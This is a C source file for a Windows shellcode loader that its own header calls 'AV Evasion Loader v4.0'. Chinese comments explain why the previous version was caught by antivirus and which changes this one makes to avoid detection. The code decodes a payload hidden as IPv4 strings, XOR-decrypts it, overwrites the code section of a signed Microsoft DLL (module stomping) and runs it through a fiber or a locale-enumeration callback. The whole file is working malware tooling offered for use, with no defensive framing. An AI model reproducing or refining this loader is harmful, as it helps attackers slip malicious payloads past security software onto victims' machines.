#include <windows.h>
#include <stdio.h>

// ============================================================
//  AV Evasion Loader v4.0 — Module Stomping Edition
//
//  v3.0 被检出原因:
//    - VirtualAlloc(RW) + VirtualProtect(RX) 在匿名内存上 → 被标记
//    - GetUserNameW → "收集系统指纹"
//    - 整体行为链触发 Dropper.389 签名
//
//  v4.0 对策:
//    - 零 VirtualAlloc 于执行内存 — 使用 Module Stomping
//    - 加载合法微软签名DLL, 覆写其 .text 段
//    - VirtualProtect 作用于签名DLL内存 (非匿名内存)
//    - 零系统信息查询 / 零反VM / 零ETW操作
//    - 执行地址位于签名DLL内 — 调用栈干净
// ============================================================

typedef char** (*GetPayloadDataFunc)();
typedef size_t (*GetPayloadSizeFunc)();
typedef const char* (*GetEncryptionKeyFunc)();

// ---- XOR decryption ----
void xor_decrypt(unsigned char* data, size_t size, const char* key, size_t keyLen) {
    for (size_t i = 0; i < size; i++)
        data[i] ^= (unsigned char)key[i % keyLen];
}

// ---- IPv4 deobfuscation ----
void deobfuscate_ipv4(unsigned char* buf, size_t size, char** ipv4, size_t count) {
    size_t off = 0;
    for (size_t i = 0; i < count && off < size; i++) {
        unsigned int a, b, c, d;
        // Two-pass parse: faster and avoids sscanf import
        const char* p = ipv4[i];
        a = 0; while (*p && *p != '.') { a = a * 10 + (*p - '0'); p++; } p++;
        b = 0; while (*p && *p != '.') { b = b * 10 + (*p - '0'); p++; } p++;
        c = 0; while (*p && *p != '.') { c = c * 10 + (*p - '0'); p++; } p++;
        d = 0; while (*p && *p != '\0') { d = d * 10 + (*p - '0'); p++; }
        buf[off] = (unsigned char)a;
        if (off + 1 < size) buf[off + 1] = (unsigned char)b;
        if (off + 2 < size) buf[off + 2] = (unsigned char)c;
        if (off + 3 < size) buf[off + 3] = (unsigned char)d;
        off += 4;
    }
}

// ---- Find .text section in a loaded PE image ----
PVOID FindTextSection(HMODULE hMod, PSIZE_T pSize) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    WORD sections = nt->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < sections; i++, sec++) {
        // .text section is always the first code section
        if (sec->Characteristics & IMAGE_SCN_CNT_CODE) {
            *pSize = sec->SizeOfRawData;
            return (PVOID)((BYTE*)hMod + sec->VirtualAddress);
        }
    }
    return NULL;
}

// ---- Primary: Fiber execution from stomped DLL ----
void ExecuteViaFiber(LPVOID entry) {
    LPVOID fiber = ConvertThreadToFiber(NULL);
    if (!fiber) return;
    LPVOID sc = CreateFiber(0, (LPFIBER_START_ROUTINE)entry, NULL);
    if (sc) {
        SwitchToFiber(sc);
        DeleteFiber(sc);
    }
    DeleteFiber(fiber);
}

// ---- Fallback: Callback execution ----
void ExecuteViaCallback(LPVOID entry) {
    // EnumSystemLocalesW: calls callback once per locale
    // Less monitored than EnumUILanguagesW in some environments
    EnumSystemLocalesW((LOCALE_ENUMPROCW)entry, 0);
}

// ============================================================
int main() {
    // ---- Step 1: Load payload DLL ----
    HMODULE pdll = LoadLibraryA("helper.dll");
    if (!pdll) return 0;

    GetPayloadDataFunc   fn_data = (GetPayloadDataFunc)GetProcAddress(pdll, "GetPayloadData");
    GetPayloadSizeFunc   fn_size = (GetPayloadSizeFunc)GetProcAddress(pdll, "GetPayloadSize");
    GetEncryptionKeyFunc fn_key  = (GetEncryptionKeyFunc)GetProcAddress(pdll, "GetEncryptionKey");
    if (!fn_data || !fn_size || !fn_key) { FreeLibrary(pdll); return 0; }

    char** ipv4      = fn_data();
    size_t ipv4Count = fn_size();
    const char* key  = fn_key();
    size_t scSize    = ipv4Count * 4;

    // ---- Step 2: Decrypt into heap (NOT VirtualAlloc) ----
    // Use HeapAlloc — looks like normal application memory
    unsigned char* decBuf = (unsigned char*)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, scSize);
    if (!decBuf) { FreeLibrary(pdll); return 0; }

    deobfuscate_ipv4(decBuf, scSize, ipv4, ipv4Count);
    xor_decrypt(decBuf, scSize, key, (size_t)strlen(key));
    FreeLibrary(pdll);

    // ---- Step 3: Module Stomping ----
    // Load a benign, signed Microsoft DLL that we will stomp.
    // msimg32.dll: tiny legacy DLL (~6KB), rarely called after load.
    HMODULE hStomp = LoadLibraryA("msimg32.dll");
    if (!hStomp) {
        // Fallback: use another small system DLL
        hStomp = LoadLibraryA("dcomp.dll");
    }
    if (!hStomp) {
        HeapFree(GetProcessHeap(), 0, decBuf);
        return 0;
    }

    // Find .text section in the loaded DLL
    SIZE_T textSize = 0;
    PVOID textAddr = FindTextSection(hStomp, &textSize);
    if (!textAddr || textSize < scSize) {
        // .text too small — try a bigger DLL
        hStomp = LoadLibraryA("dwmapi.dll");
        textAddr = FindTextSection(hStomp, &textSize);
    }
    if (!textAddr || textSize < scSize) {
        HeapFree(GetProcessHeap(), 0, decBuf);
        return 0;
    }

    // ---- Step 4: Overwrite .text with shellcode ----
    DWORD oldProtect;
    // RW for writing
    VirtualProtect(textAddr, scSize, PAGE_READWRITE, &oldProtect);
    memcpy(textAddr, decBuf, scSize);
    // RX for execution (never RWX — only 2 states: RW then RX)
    VirtualProtect(textAddr, scSize, PAGE_EXECUTE_READ, &oldProtect);

    // ---- Step 5: Wipe plaintext from heap ----
    SecureZeroMemory(decBuf, scSize);
    HeapFree(GetProcessHeap(), 0, decBuf);

    // ---- Step 6: Execute from stomped DLL ----
    // The call address is inside a valid Microsoft-signed DLL
    // Call stack will show: legitimate.dll!textSection
    // Primary: Fiber
    ExecuteViaFiber(textAddr);

    // Fallback: Callback (reached if fiber returns)
    ExecuteViaCallback(textAddr);

    return 0;
}
